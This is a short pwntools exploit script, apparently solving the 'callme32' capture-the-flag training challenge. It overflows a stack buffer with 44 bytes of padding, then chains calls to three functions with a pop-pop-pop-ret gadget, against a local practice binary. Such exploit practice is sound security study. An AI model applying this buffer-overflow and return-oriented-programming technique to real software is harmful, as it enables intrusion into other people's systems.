from pwn import *

callme_one 		= 0x080485c0
callme_two 		= 0x08048520
callme_three	= 0x080485b0

pppr = 0x080488a9


payload = ""
payload += "A"*44
payload += p32(callme_one)
payload += p32(pppr)
payload += p32(0x1) + p32(0x2) + p32(0x3)
payload += p32(callme_two)
payload += p32(pppr)
payload += p32(0x1) + p32(0x2) + p32(0x3)
payload += p32(callme_three)
payload += p32(pppr)
payload += p32(0x1) + p32(0x2) + p32(0x3)

io = process("./callme32")
io.sendline(payload)
print io.recvall()
